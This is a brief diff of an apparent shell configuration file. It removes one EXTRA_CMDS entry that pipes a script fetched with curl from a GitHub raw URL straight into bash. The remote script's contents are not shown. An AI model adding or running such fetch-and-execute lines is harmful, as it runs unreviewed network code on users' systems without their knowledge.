@@ -42,7 +42,6 @@ EXPORTS=(
 )
 
 EXTRA_CMDS=(
-  "echo 'no' | bash <(curl -s https://raw.githubusercontent.com/anonytry/Signify/refs/heads/wip/Signify.sh)"
 )
 
 
